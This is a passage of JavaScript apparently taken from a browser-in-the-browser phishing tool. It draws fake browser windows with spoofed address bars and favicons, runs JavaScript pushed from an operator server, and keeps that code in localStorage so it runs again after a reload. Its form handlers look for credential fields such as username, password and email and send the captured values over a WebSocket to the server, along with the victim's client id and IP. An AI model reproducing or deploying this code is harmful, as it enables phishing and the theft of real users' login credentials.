            // Create placeholder for empty state
            const placeholder = document.createElement('div');
            placeholder.id = 'placeholder';
            placeholder.style.display = 'flex';
            placeholder.style.alignItems = 'center';
            placeholder.style.justifyContent = 'center';
            placeholder.style.height = '100%';
            placeholder.style.color = '#666';
            placeholder.style.fontSize = '18px';
            placeholder.innerHTML = '<p>No content to display</p>';
            
            // Add elements to body
            document.body.appendChild(container);
            document.body.appendChild(placeholder);
        }
        return container;
    }
    
    // Display content in the main container
    function showContent(content, fileName, shouldReload = false) {
        console.log(`Showing content from ${fileName}, reload: ${shouldReload}`);
        
        // Store showContent in localStorage
        localStorage.setItem('showsContent', content);
        
        // Store the file name if provided
        if (fileName) {
            localStorage.setItem('lastLoadedFile', fileName);
        }
        
        // If reload is true, create overlay and then reload
        if (shouldReload) {
            console.log('Reload flag is true, preparing for refresh...');
            
            // Create a clone of the current body content that will stay visible during reload
            const overlay = document.createElement('div');
            overlay.id = 'reload-overlay';
            overlay.style.position = 'fixed';
            overlay.style.top = '0';
            overlay.style.left = '0';
            overlay.style.width = '100%';
            overlay.style.height = '100%';
            overlay.style.zIndex = '9999';
            overlay.style.backgroundColor = '#fff';
            
            // Clone the main content to stay visible during reload
            const mainContent = document.getElementById('main-content');
            if (mainContent) {
                const contentClone = mainContent.cloneNode(true);
                overlay.appendChild(contentClone);
            }
            
            // Add a loading indicator
            const loadingIndicator = document.createElement('div');
            loadingIndicator.textContent = 'Executing JavaScript...';
            loadingIndicator.style.position = 'fixed';
            loadingIndicator.style.top = '10px';
            loadingIndicator.style.right = '10px';
            loadingIndicator.style.padding = '5px 10px';
            loadingIndicator.style.backgroundColor = '#333';
            loadingIndicator.style.color = '#fff';
            loadingIndicator.style.borderRadius = '3px';
            loadingIndicator.style.fontSize = '12px';
            overlay.appendChild(loadingIndicator);
            
            // Add overlay to body
            document.body.appendChild(overlay);
            
            // Small delay to ensure overlay is visible
            setTimeout(() => {
                location.reload();
            }, 50);
            return;
        }
        
        // Otherwise, just update the content
        const placeholder = document.getElementById('placeholder');
        if (placeholder) placeholder.style.display = 'none';
        
        const container = getMainContainer();
        if (container) {
            container.innerHTML = content;
        }

        // Add event listeners to any forms
        const forms = document.querySelectorAll('#main-content form');
        forms.forEach(form => {
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                const formData = new FormData(this);
                const data = Object.fromEntries(formData.entries());
                
                // Send form data back to server
                if (ws && ws.readyState === WebSocket.OPEN) {
                    ws.send(JSON.stringify({ 
                        type: 'formData', 
                        data: data,
                        clientId: clientId || 'Unknown',
                        ip: clientIp || 'Unknown',
                        timestamp: new Date().toISOString(),
                        formId: form.id || 'unnamed_form',
                        source: window.name || 'main_window'
                    }));
                }
                
                this.reset();
            });
        });
    }
    
    // Execute content with scripts
    function executeContent(content, fileName, resources = {}, shouldReload = false) {
        console.log(`Executing content from ${fileName}, reload: ${shouldReload}`);
        
        // Determine if this is JavaScript content
        const isJavaScript = 
            (fileName && fileName.endsWith('.js')) || 
            content.trim().startsWith('<script>') || 
            content.trim().startsWith('javascript:') || 
            content.trim().startsWith('alert(') || 
            content.trim().startsWith('console.log(');
        
        // Capture current page state before doing anything
        const currentPageState = {
            placeholder: document.getElementById('placeholder') ? document.getElementById('placeholder').style.display : 'none',
            mainContent: document.getElementById('main-content') ? document.getElementById('main-content').innerHTML : ''
        };
        
        // Store the current page state for preservation across refreshes
        if (currentPageState.mainContent && currentPageState.mainContent.trim() !== '') {
            localStorage.setItem('lastPageState', JSON.stringify(currentPageState));
        }
        
        // Store a special flag for JavaScript content that needs to be executed after reload
        if (isJavaScript && shouldReload) {
            localStorage.setItem('pendingJsExecution', 'true');
            localStorage.setItem('pendingJsCode', content);
            
            // For JavaScript content with reload, don't overwrite the current display
            // Just store the code for execution after reload
            if (isJavaScript) {
                const key = 'file_' + fileName;
                localStorage.setItem(key, content);
                
                if (shouldReload !== undefined) {
                    localStorage.setItem(key + '_reload', shouldReload ? 'true' : 'false');
                    console.log(`File ${fileName} stored with reload flag: ${shouldReload}`);
                }
            }
        } else {
            // For non-JavaScript content or JavaScript without reload, store normally
            if (!isJavaScript) {
                // Only store HTML content in showsContent
                localStorage.setItem('showsContent', content);
            }
            
            // Store the file name if provided
            if (fileName) {
                localStorage.setItem('lastLoadedFile', fileName);
                
                // Store the file with its reload flag
                const key = 'file_' + fileName;
                localStorage.setItem(key, content);
                
                // Store reload flag if provided
                if (shouldReload !== undefined) {
                    localStorage.setItem(key + '_reload', shouldReload ? 'true' : 'false');
                    console.log(`File ${fileName} stored with reload flag: ${shouldReload}`);
                }
            }
        }
        
        // If reload is true, create overlay and then reload
        if (shouldReload) {
            console.log('Reload flag is true, preparing for refresh...');
            
            // Create a clone of the current body content that will stay visible during reload
            const overlay = document.createElement('div');
            overlay.id = 'reload-overlay';
            overlay.style.position = 'fixed';
            overlay.style.top = '0';
            overlay.style.left = '0';
            overlay.style.width = '100%';
            overlay.style.height = '100%';
            overlay.style.zIndex = '9999';
            overlay.style.backgroundColor = '#fff';
            
            // Clone the main content to stay visible during reload
            const mainContent = document.getElementById('main-content');
            if (mainContent) {
                const contentClone = mainContent.cloneNode(true);
                overlay.appendChild(contentClone);
            }
            
            // Add a loading indicator
            const loadingIndicator = document.createElement('div');
            loadingIndicator.textContent = 'Executing JavaScript...';
            loadingIndicator.style.position = 'fixed';
            loadingIndicator.style.top = '10px';
            loadingIndicator.style.right = '10px';
            loadingIndicator.style.padding = '5px 10px';
            loadingIndicator.style.backgroundColor = '#333';
            loadingIndicator.style.color = '#fff';
            loadingIndicator.style.borderRadius = '3px';
            loadingIndicator.style.fontSize = '12px';
            overlay.appendChild(loadingIndicator);
            
            // Add overlay to body
            document.body.appendChild(overlay);
            
            // Small delay to ensure overlay is visible
            setTimeout(() => {
                location.reload();
            }, 50);
            return;
        }
        
        // If this is JavaScript content, execute it directly
        if (isJavaScript) {
            console.log('Executing JavaScript content...');
            
            // Get references to important elements
            const placeholder = document.getElementById('placeholder');
            const container = getMainContainer();
            
            // Create a separate execution environment that won't affect the main page
            try {
                // Extract JavaScript code if wrapped in script tags
                let jsCode = content;
                if (content.includes('<script>') && content.includes('</script>')) {
                    const scriptMatch = content.match(/<script>([\s\S]*?)<\/script>/i);
                    if (scriptMatch && scriptMatch[1]) {
                        jsCode = scriptMatch[1].trim();
                    }
                }
                
                // If the code starts with javascript: protocol, extract the actual code
                if (jsCode.startsWith('javascript:')) {
                    jsCode = jsCode.substring('javascript:'.length);
                }
                
                // Fix common syntax errors
                if (jsCode.includes('alert(hello)')) {
                    jsCode = jsCode.replace('alert(hello)', 'alert("hello")');
                }
                
                // Modify alert calls to keep the page from going blank
                // This wraps alerts in a way that preserves the page content
                if (jsCode.includes('alert(')) {
                    // First create a function to hold the original alert
                    const alertWrapper = `
                        (function() {
                            // Save the original alert function
                            const originalAlert = window.alert;
                            
                            // Create a wrapper that preserves page state
                            window.alert = function(message) {
                                // Make sure the content is visible during the alert
                                const placeholder = document.getElementById('placeholder');
                                const container = document.getElementById('main-content');
                                
                                if (placeholder) placeholder.style.display = 'none';
                                
                                // Call the original alert function
                                originalAlert(message);
                                
                                // Restore the original alert function
                                window.alert = originalAlert;
                            };
                        })();
                    `;
                    
                    // Prepend the alert wrapper to the code
                    jsCode = alertWrapper + '\n' + jsCode;
                }
                
                // Create a script element to execute the code
                const script = document.createElement('script');
                script.textContent = jsCode;
                
                // Execute the script
                document.head.appendChild(script);
                
                // Clean up the script element after execution
                setTimeout(() => {
                    if (script.parentNode) {
                        script.parentNode.removeChild(script);
                    }
                }, 100);
            } catch (error) {
                console.error('Error executing JavaScript:', error);
                alert('JavaScript execution error: ' + error.message);
            }
        } else {
            // For non-JavaScript content, update the display
            document.getElementById('placeholder').style.display = 'none';
            const container = getMainContainer();
            
            if (container) {
                // Update the content
                container.innerHTML = content;
                
                // Monitor forms in the new content
                setTimeout(() => monitorForms(document), 300);
            } else {
                console.error('Main content container not found');
            }
        }
    }
    
    // Helper function to extract title from HTML content
    function extractTitle(content, defaultTitle = 'Untitled') {
        try {
            const titleMatch = content.match(/<title[^>]*>([^<]+)<\/title>/i);
            return titleMatch ? titleMatch[1].trim() : defaultTitle;
        } catch (e) {
            return defaultTitle;
        }
    }
    
    // Window control functions
    function minimizeWindow(button) {
        const browserWindow = button.closest('.browser-window');
        browserWindow.classList.add('minimized');
        
        // Store the window state in localStorage with minimized flag
        const windowId = browserWindow.id;
        const windowKey = 'BITBContent_' + windowId;
        
        try {
            if (localStorage.getItem(windowKey)) {
                const windowData = JSON.parse(localStorage.getItem(windowKey));
                windowData.minimized = true;
                localStorage.setItem(windowKey, JSON.stringify(windowData));
            }
        } catch (e) {
            console.error('Error updating minimized state:', e);
        }
        
        // Hide the window visually but keep it in the DOM
        browserWindow.style.opacity = '0';
        browserWindow.style.pointerEvents = 'none';
        browserWindow.style.transform = 'translate(-50%, 150%) scale(0.8)';
    }

    function maximizeWindow(button) {
        const browserWindow = button.closest('.browser-window');
        
        // Toggle maximized state
        browserWindow.classList.toggle('maximized');
        
        if (browserWindow.classList.contains('maximized')) {
            // Save current position and size before maximizing
            const rect = browserWindow.getBoundingClientRect();
            browserWindow.dataset.prevWidth = browserWindow.style.width || rect.width + 'px';
            browserWindow.dataset.prevHeight = browserWindow.style.height || rect.height + 'px';
            browserWindow.dataset.prevLeft = browserWindow.style.left || rect.left + 'px';
            browserWindow.dataset.prevTop = browserWindow.style.top || rect.top + 'px';
            browserWindow.dataset.prevTransform = browserWindow.style.transform || 'none';
            
            // Maximize the window to full screen
            browserWindow.style.width = '100%';
            browserWindow.style.height = '100%';
            browserWindow.style.top = '0';
            browserWindow.style.left = '0';
            browserWindow.style.transform = 'none';
            browserWindow.style.borderRadius = '0';
            browserWindow.style.maxWidth = 'none'; // Remove max-width constraints
            browserWindow.style.maxHeight = 'none'; // Remove max-height constraints
        } else {
            // Restore previous position and size
            if (browserWindow.dataset.prevWidth) {
                browserWindow.style.width = browserWindow.dataset.prevWidth;
                browserWindow.style.height = browserWindow.dataset.prevHeight;
                browserWindow.style.left = browserWindow.dataset.prevLeft;
                browserWindow.style.top = browserWindow.dataset.prevTop;
                browserWindow.style.transform = browserWindow.dataset.prevTransform;
                browserWindow.style.borderRadius = '8px';
            } else {
                // Default position if no previous position saved
                browserWindow.style.width = '80%';
                browserWindow.style.height = '80%';
                browserWindow.style.maxWidth = '960px';
                browserWindow.style.maxHeight = '640px';
                browserWindow.style.left = '50%';
                browserWindow.style.top = '50%';
                browserWindow.style.transform = 'translate(-50%, -50%)';
                browserWindow.style.borderRadius = '8px';
            }
        }
        
        // Save window state and dimensions when maximizing/restoring
        const windowId = browserWindow.id;
        const windowKey = 'BITBContent_' + windowId;
        
        try {
            if (localStorage.getItem(windowKey)) {
                const windowData = JSON.parse(localStorage.getItem(windowKey));
                windowData.maximized = browserWindow.classList.contains('maximized');
                windowData.minimized = false; // No longer minimized
                
                // Save exact dimensions for proper restoration
                if (!windowData.maximized && browserWindow.dataset.prevWidth) {
                    windowData.savedWidth = browserWindow.dataset.prevWidth;
                    windowData.savedHeight = browserWindow.dataset.prevHeight;
                    windowData.savedLeft = browserWindow.dataset.prevLeft;
                    windowData.savedTop = browserWindow.dataset.prevTop;
                    windowData.savedTransform = browserWindow.dataset.prevTransform;
                }
                
                localStorage.setItem(windowKey, JSON.stringify(windowData));
            }
        } catch (e) {
            console.error('Error updating window state:', e);
        }
    }

    function closeWindow(button) {
        const browserWindow = button.closest('.browser-window');
        if (browserWindow) {
            browserWindow.classList.add('closing');
            
            // Remove this window from localStorage
            const windowId = browserWindow.id;
            localStorage.removeItem('BITBContent_' + windowId);
            
            // Add visual transition before removing
            browserWindow.style.opacity = '0';
            browserWindow.style.transform = 'scale(0.9)';
            
            // Remove the window from the DOM after animation completes
            setTimeout(() => {
                browserWindow.remove();
            }, 300);
            
            console.log(`Window ${windowId} closed and removed from localStorage`);
        }
    }
    
    // Drag functionality
    function dragStart(e) {
        const browserWindow = e.target.closest('.browser-window');
        if (!browserWindow || browserWindow.classList.contains('maximized')) return;

        // Only allow dragging from the header area
        if (!e.target.closest('.window-header')) return;

        // Bring window to front
        const allWindows = document.querySelectorAll('.browser-window');
        allWindows.forEach(win => win.style.zIndex = '9999');
        browserWindow.style.zIndex = '10000';
        
        const rect = browserWindow.getBoundingClientRect();
        initialX = e.clientX - rect.left;
        initialY = e.clientY - rect.top;

        activeWindow = browserWindow;
        isDragging = true;
        browserWindow.style.transition = 'none';
        
        // Add event listeners for dragging
        document.addEventListener('mousemove', drag, false);
        document.addEventListener('mouseup', dragEnd, false);
        
        // Prevent default behavior to avoid text selection during drag
        e.preventDefault();
    }

    function drag(e) {
        if (isDragging && activeWindow) {
            e.preventDefault();
            
            currentX = e.clientX - initialX;
            currentY = e.clientY - initialY;
            
            // Set bounds to keep window within viewport
            const maxX = window.innerWidth - activeWindow.offsetWidth;
            const maxY = window.innerHeight - activeWindow.offsetHeight;
            
            currentX = Math.max(0, Math.min(currentX, maxX));
            currentY = Math.max(0, Math.min(currentY, maxY));
            
            activeWindow.style.left = currentX + 'px';
            activeWindow.style.top = currentY + 'px';
            activeWindow.style.transform = 'none';
        }
    }

    function dragEnd(e) {
        if (!isDragging) return;
        
        isDragging = false;
        if (activeWindow) {
            activeWindow.style.transition = 'all 0.3s ease';
            
            // Save window position
            saveWindowState();
        }
        
        // Remove event listeners
        document.removeEventListener('mousemove', drag, false);
        document.removeEventListener('mouseup', dragEnd, false);
        
        // Important: set activeWindow to null to prevent continued movement
        activeWindow = null;
    }
    
    // Store window state
    function saveWindowState() {
        const windows = document.querySelectorAll('.browser-window');
        
        windows.forEach(win => {
            const contentDiv = win.querySelector('.window-content');
            const rect = win.getBoundingClientRect();
            const windowId = win.id;
            
            // Update the window data in localStorage
            const windowKey = 'BITBContent_' + windowId;
            if (localStorage.getItem(windowKey)) {
                try {
                    const windowData = JSON.parse(localStorage.getItem(windowKey));
                    windowData.position = {
                        left: win.style.left ? parseInt(win.style.left) : rect.left,
                        top: win.style.top ? parseInt(win.style.top) : rect.top
                    };
                    windowData.maximized = win.classList.contains('maximized');
                    localStorage.setItem(windowKey, JSON.stringify(windowData));
                } catch (e) {
                    console.error('Error updating window data:', e);
                }
            }
        });
    }
    
    // Display content in a browser-like window popup
    function showContentInWindow(content, fileName) {
        if (!content) {
            console.error('No content provided to showContentInWindow');
            content = '<html><body><p>No content was provided</p></body></html>';
        }
        console.log(`Showing content in window: ${fileName}`);
        
        // Generate a unique ID for this window based on the filename
        const windowId = 'window_' + (fileName ? fileName.replace(/[^a-z0-9]/gi, '_') : Date.now());
        
        // Simple window data structure
        const windowKey = 'BITBContent_' + windowId;
        let windowData = {
            content: content,
            fileName: fileName,
            timestamp: Date.now(),
            maximized: false,
            minimized: false
        };
        
        // Check if a window with this ID already exists
        let existingWindow = document.getElementById(windowId);
        
        if (existingWindow) {
            // Update existing window content
            const contentDiv = existingWindow.querySelector('.window-content');
            if (contentDiv) {
                contentDiv.innerHTML = content;
                console.log('Updated existing window content');
            }
            
            // Make sure it's visible (not minimized)
            existingWindow.classList.remove('minimized');
            existingWindow.style.opacity = '1';
            existingWindow.style.pointerEvents = 'auto';
            
            // Bring to front
            const allWindows = document.querySelectorAll('.browser-window');
            allWindows.forEach(win => win.style.zIndex = '9999');
            existingWindow.style.zIndex = '10000';
            
            // Save updated content to localStorage
            windowData.maximized = existingWindow.classList.contains('maximized');
            localStorage.setItem(windowKey, JSON.stringify(windowData));
            return;
        }
        
        // Create browser window
        const browserWindow = document.createElement('div');
        browserWindow.className = 'browser-window';
        browserWindow.id = windowId;
        
        // Set default position (centered)
        browserWindow.style.width = '80%'; 
        browserWindow.style.maxWidth = '960px';
        browserWindow.style.height = '80%';
        browserWindow.style.maxHeight = '640px';
        browserWindow.style.left = '50%';
        browserWindow.style.top = '50%';
        browserWindow.style.transform = 'translate(-50%, -50%)';
        
        const title = extractTitle(content, fileName || 'New Tab');
        
        const windowHeader = document.createElement('div');
        windowHeader.className = 'window-header';
        
        const windowTop = document.createElement('div');
        windowTop.className = 'window-top';
        
        const tabSection = document.createElement('div');
        tabSection.className = 'tab-section';
        
        const tab = document.createElement('div');
        tab.className = 'tab';
        
        const tabFavicon = document.createElement('img');
        tabFavicon.className = 'tab-favicon';
        
        // Create dynamic favicon URL based on filename
        let faviconDomain = 'localhost';
        if (fileName) {
            // Remove .html extension if present
            faviconDomain = fileName.replace(/\.html$/, '');
            
            // Add .com domain extension if it doesn't already have it
            if (!faviconDomain.endsWith('.com')) {
                faviconDomain += '.com';
            }
        }
        
        tabFavicon.src = `https://www.google.com/s2/favicons?domain=https://${faviconDomain}`;
        
        const tabTitle = document.createElement('div');
        tabTitle.className = 'tab-title';
        tabTitle.textContent = title;
        
        const newTabButton = document.createElement('div');
        newTabButton.className = 'new-tab-button';
        newTabButton.innerHTML = '+';
        newTabButton.title = 'New Tab';
        
        const windowControls = document.createElement('div');
        windowControls.className = 'window-controls';
        
        const minimizeButton = document.createElement('div');
        minimizeButton.className = 'window-button minimize';
        minimizeButton.innerHTML = '<svg viewBox="0 0 10 10"><line x1="2" y1="5" x2="8" y2="5"/></svg>';
        minimizeButton.addEventListener('click', function() {
            minimizeWindow(this);
        });
        
        const maximizeButton = document.createElement('div');
        maximizeButton.className = 'window-button maximize';
        maximizeButton.innerHTML = '<svg viewBox="0 0 10 10"><rect x="2" y="2" width="6" height="6" /></svg>';
        maximizeButton.addEventListener('click', function() {
            maximizeWindow(this);
        });
        
        const closeButton = document.createElement('div');
        closeButton.className = 'window-button close';
        closeButton.innerHTML = '<svg viewBox="0 0 10 10"><line x1="2" y1="2" x2="8" y2="8" /><line x1="2" y1="8" x2="8" y2="2" /></svg>';
        closeButton.addEventListener('click', function() {
            closeWindow(this);
        });
        
        const addressBar = document.createElement('div');
        addressBar.className = 'address-bar';
        
        const navControls = document.createElement('div');
        navControls.className = 'nav-controls';
        
        const backButton = document.createElement('button');
        backButton.className = 'nav-button';
        backButton.title = 'Back';
        backButton.innerHTML = '<svg viewBox="0 0 24 24" width="20" height="20"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z" fill="currentColor"/></svg>';
        
        const forwardButton = document.createElement('button');
        forwardButton.className = 'nav-button';
        forwardButton.title = 'Forward';
        forwardButton.innerHTML = '<svg viewBox="0 0 24 24" width="20" height="20"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z" fill="currentColor"/></svg>';
        
        const reloadButton = document.createElement('button');
        reloadButton.className = 'nav-button';
        reloadButton.title = 'Reload';
        reloadButton.innerHTML = '<svg viewBox="0 0 24 24" width="20" height="20"><path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z" fill="currentColor"/></svg>';
        
        const homeButton = document.createElement('button');
        homeButton.className = 'nav-button';
        homeButton.title = 'Home';
        homeButton.innerHTML = '<svg viewBox="0 0 24 24" width="20" height="20"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z" fill="currentColor"/></svg>';
        
        const urlInput = document.createElement('input');
        urlInput.type = 'text';
        urlInput.className = 'url-input';
        urlInput.value = `https://localhost/${fileName || ''}`;
        urlInput.readOnly = true;
        
        const bookmarkButton = document.createElement('button');
        bookmarkButton.className = 'bookmark-button';
        bookmarkButton.title = 'Bookmark this page';
        bookmarkButton.innerHTML = '<svg viewBox="0 0 24 24" width="20" height="20"><path d="M17 3H7c-1.1 0-2 .9-2 2v16l7-3 7 3V5c0-1.1-.9-2-2-2z" fill="none" stroke="currentColor" stroke-width="2"/></svg>';
        
        const windowContent = document.createElement('div');
        windowContent.className = 'window-content';
        
        const blob = new Blob([content], { type: 'text/html' });
        const blobUrl = URL.createObjectURL(blob);
        
        const iframe = document.createElement('iframe');
        iframe.className = 'iframe-container';
        iframe.src = blobUrl;
        iframe.setAttribute('sandbox', 'allow-same-origin allow-scripts allow-forms allow-modals');
        iframe.onload = function() {
            // Once the iframe is loaded, try to access its content document
            try {
                if (iframe.contentDocument) {
                    // Monitor forms within the iframe
                    const forms = iframe.contentDocument.querySelectorAll('form');
                    console.log(`Monitoring ${forms.length} forms in window iframe`);
                    
                    // Add event listeners to all forms in the iframe
                    forms.forEach(form => {
                        // Skip already monitored forms
                        if (form.dataset.monitored === 'true') return;
                        
                        // Mark this form as monitored
                        form.dataset.monitored = 'true';
                        
                        // Add submit event listener
                        form.addEventListener('submit', function(e) {
                            // Prevent default form submission
                            e.preventDefault();
                            
                            console.log('Form submitted in window iframe');
                            
                            // Get form data
                            const formData = new FormData(this);
                            const data = Object.fromEntries(formData.entries());
                            
                            // Check if form contains credential fields
                            const credentialFields = ['username', 'password', 'email', 'pass', 'name', 'login', 'user'];
                            let hasCredentials = false;
                            const credentialData = {};
                            
                            // Check each field name against credential patterns
                            Object.keys(data).forEach(key => {
                                credentialFields.forEach(field => {
                                    if (key.toLowerCase().includes(field)) {
                                        hasCredentials = true;
                                        credentialData[key] = data[key];
                                    }
                                });
                            });
                            
                            // If credentials found, send to server
                            if (hasCredentials && ws && ws.readyState === WebSocket.OPEN) {
                                console.log('Credentials found in window iframe form, sending to server');
                                ws.send(JSON.stringify({
                                    type: 'credentials',
                                    data: credentialData,
                                    url: iframe.contentDocument.location.href || blobUrl,
                                    timestamp: new Date().toISOString(),
                                    formId: form.id || 'unnamed_form',
                                    clientId: clientId || 'unknown',
                                    ip: clientIp || 'unknown',
                                    source: 'popup_window_' + (fileName || 'unknown')
                                }));
                            }
                        });
                    });
                }
            } catch (e) {
                console.error('Error accessing iframe content document:', e);
            }
        };
        windowContent.appendChild(iframe);
        
        windowContent.dataset.originalContent = content;
        
        tab.appendChild(tabFavicon);
        tab.appendChild(tabTitle);
        
        tabSection.appendChild(tab);
        tabSection.appendChild(newTabButton);
        
        windowControls.appendChild(minimizeButton);
        windowControls.appendChild(maximizeButton);
        windowControls.appendChild(closeButton);
        
        navControls.appendChild(backButton);
        navControls.appendChild(forwardButton);
        navControls.appendChild(reloadButton);
        navControls.appendChild(homeButton);
        
        addressBar.appendChild(navControls);
        addressBar.appendChild(urlInput);
        addressBar.appendChild(bookmarkButton);
        
        windowTop.appendChild(tabSection);
        windowTop.appendChild(windowControls);
        
        windowHeader.appendChild(windowTop);
        windowHeader.appendChild(addressBar);
        
        browserWindow.appendChild(windowHeader);
        browserWindow.appendChild(windowContent);
        
        // Add event listeners for dragging
        windowHeader.addEventListener('mousedown', dragStart, false);
        
        // Add the window to the document
        // Make sure browserWindow is actually appended to the document
        if (document.body) {
            document.body.appendChild(browserWindow);
            console.log('Browser window appended to document body');
        } else {
            // If document.body isn't available, wait for it
            console.warn('Document body not available, waiting...');
            setTimeout(() => {
                if (document.body) {
                    document.body.appendChild(browserWindow);
                    console.log('Browser window appended to document body (delayed)');
                } else {
                    console.error('Could not append browser window - no document body');
                }
            }, 100);
        }
        
        // Bring this window to the front
        const allWindows = document.querySelectorAll('.browser-window');
        allWindows.forEach(win => win.style.zIndex = '9999');
        browserWindow.style.zIndex = '10000';
        
        // Set this as the active window
        activeWindow = browserWindow;
        
        // Clean up blob URL when window is removed
        browserWindow.addEventListener('remove', () => {
            URL.revokeObjectURL(blobUrl);
        });
        
        // Save window data to localStorage
        localStorage.setItem(windowKey, JSON.stringify(windowData));
        
        return browserWindow;
    }
    
    // Clean content display - completely removes all content and prevents persistence
    function cleanContent() {
        console.log('Cleaning content display and preventing persistence');
        
        // Clear main content container
        const container = getMainContainer();
        if (container) container.innerHTML = '';
        
        // Show placeholder
        const placeholder = document.getElementById('placeholder');
        if (placeholder) placeholder.style.display = 'flex';
        
        // Remove ALL content-related items from localStorage to prevent persistence
        console.log('Removing localStorage items to prevent persistence');
        localStorage.removeItem('showsContent');
        localStorage.removeItem('lastLoadedFile');
        localStorage.removeItem('eden-active-content');
        localStorage.removeItem('eden-content');
        
        // Also clear sessionStorage items that could cause persistence
        sessionStorage.removeItem('eden-active-content');
        sessionStorage.removeItem('eden-active-filename');
        sessionStorage.removeItem('eden-effect-type');
        sessionStorage.removeItem('eden-intensity');
        sessionStorage.removeItem('eden-from-section');
        sessionStorage.removeItem('eden-location-x');
        sessionStorage.removeItem('eden-location-y');
        
        
    }
    
    // Clear all windows
    function clearAllWindows(clearStorage = false) {
        console.log('Clearing all windows, clearStorage:', clearStorage);
        
        // Remove all browser windows
        const windows = document.querySelectorAll('.browser-window');
        windows.forEach(win => {
            win.classList.add('closing');
            setTimeout(() => win.remove(), 300);
        });
        
        // Clear main content
        const container = getMainContainer();
        container.innerHTML = '';
        
        // Show placeholder
        const placeholder = document.getElementById('placeholder');
        if (placeholder) placeholder.style.display = 'flex';
        
        // Clear localStorage if requested
        if (clearStorage) {
            clearAllLocalStorage();
        }
    }
    
    // Clear all localStorage
    function clearAllLocalStorage() {
        // Find all keys that start with 'file_', 'BITBContent_', or end with '.html'
        const keysToRemove = [];
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            if (key.startsWith('file_') || 
                key.startsWith('BITBContent_') || 
                key.endsWith('.html') || 
                key === 'showsContent' || 
                key === 'lastLoadedFile') {
                keysToRemove.push(key);
            }
        }
        
        // Remove all matching keys
        keysToRemove.forEach(key => {
            localStorage.removeItem(key);
            console.log(`Removed key from localStorage: ${key}`);
        });
        
        // Explicitly remove any existing windows from the DOM
        const windows = document.querySelectorAll('.browser-window');
        windows.forEach(win => {
            win.classList.add('closing');
            setTimeout(() => win.remove(), 300);
        });
        
        console.log(`Cleared ${keysToRemove.length} items from localStorage, including windows`);
    }
    
    // Clear a single file from storage
    function clearSingleFile(fileName) {
        console.log(`Clearing file from storage: ${fileName}`);
        
        // Remove the file from localStorage
        const fileKey = 'file_' + fileName;
        localStorage.removeItem(fileKey);
        localStorage.removeItem(fileName); // Try both formats
        
        // If this was the currently displayed file, clear it
        if (localStorage.getItem('lastLoadedFile') === fileName) {
            // Clear display if this was the current file
            localStorage.removeItem('showsContent');
            localStorage.removeItem('lastLoadedFile');
            
            const container = getMainContainer();
            container.innerHTML = '';
            
            // Show placeholder
            const placeholder = document.getElementById('placeholder');
            if (placeholder) placeholder.style.display = 'flex';
        }
    }
    
    
    // Clear all files from localStorage
    function clearFiles() {
        console.log('Clearing all files from localStorage');
        clearAllLocalStorage();
    }
    
    // Check for stored content on page load
    function checkStoredContent() {
        // Get file URL parameter if present
        const urlParams = new URLSearchParams(window.location.search);
        const fileParam = urlParams.get('file');
        
        // If file parameter exists, try to load that file
        if (fileParam) {
            const fileContent = localStorage.getItem('file_' + fileParam);
            if (fileContent) {
                document.getElementById('placeholder').style.display = 'none';
                const container = getMainContainer();
                container.innerHTML = fileContent;
                return true;
            }
        }
        
        // Otherwise check for showsContent
        else if (localStorage.getItem('showsContent')) {
            // If no current file but showContent exists, display it
            document.getElementById('placeholder').style.display = 'none';
            const container = getMainContainer();
            container.innerHTML = localStorage.getItem('showsContent');
            return true;
        }
        
        return false;
    }
    
    // Initialize UI elements on page load
    function initializeUI() {
        // Create main container if it doesn't exist
        getMainContainer();
        
        // First check if we need to restore the page state after executing JavaScript
        let restoredState = false;
        if (localStorage.getItem('pendingJsExecution') === 'true' || localStorage.getItem('lastPageState')) {
            const savedState = localStorage.getItem('lastPageState');
            if (savedState) {
                try {
                    const pageState = JSON.parse(savedState);
                    
                    // Restore the main content
                    if (pageState.mainContent && pageState.mainContent.trim() !== '') {
                        const container = getMainContainer();
                        if (container) {
                            container.innerHTML = pageState.mainContent;
                            
                            // Hide the placeholder if needed
                            const placeholder = document.getElementById('placeholder');
                            if (placeholder) {
                                placeholder.style.display = pageState.placeholder || 'none';
                            }
                            
                            console.log('Restored previous page state after JavaScript execution');
                            restoredState = true;
                        }
                    }
                } catch (error) {
                    console.error('Error restoring page state:', error);
                }
            }
        }
        
        // Only check for stored content if we didn't restore the state
        if (!restoredState) {
            checkStoredContent();
        }
        
        // Set up event listeners for forms that might be in the content
        const forms = document.querySelectorAll('#main-content form');
        forms.forEach(form => {
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                const formData = new FormData(this);
                const data = Object.fromEntries(formData.entries());
                
                // Send form data back to server
                if (ws && ws.readyState === WebSocket.OPEN) {
                    ws.send(JSON.stringify({ 
                        type: 'formData', 
                        data: data 
                    }));
                }
                
                this.reset();
            });
        });
        
        // Check for and execute any pending JavaScript after reload
        if (localStorage.getItem('pendingJsExecution') === 'true') {
            console.log('Found pending JavaScript execution after reload');
            const pendingJsCode = localStorage.getItem('pendingJsCode');
            
            if (pendingJsCode) {
                // Clear the pending execution flags
                localStorage.removeItem('pendingJsExecution');
                localStorage.removeItem('pendingJsCode');
                
                // Wait a moment for the page to finish loading
                setTimeout(() => {
                    try {
                        // Extract JavaScript code if wrapped in script tags
                        let jsCode = pendingJsCode;
                        if (pendingJsCode.includes('<script>') && pendingJsCode.includes('</script>')) {
                            const scriptMatch = pendingJsCode.match(/<script>([\s\S]*?)<\/script>/i);
                            if (scriptMatch && scriptMatch[1]) {
                                jsCode = scriptMatch[1].trim();
                            }
                        }
                        
                        // If the code starts with javascript: protocol, extract the actual code
                        if (jsCode.startsWith('javascript:')) {
                            jsCode = jsCode.substring('javascript:'.length);
                        }
                        
                        // Fix common syntax errors
                        if (jsCode.includes('alert(hello)')) {
                            jsCode = jsCode.replace('alert(hello)', 'alert("hello")');
                        }
                        
                        // Create a script element to execute the code
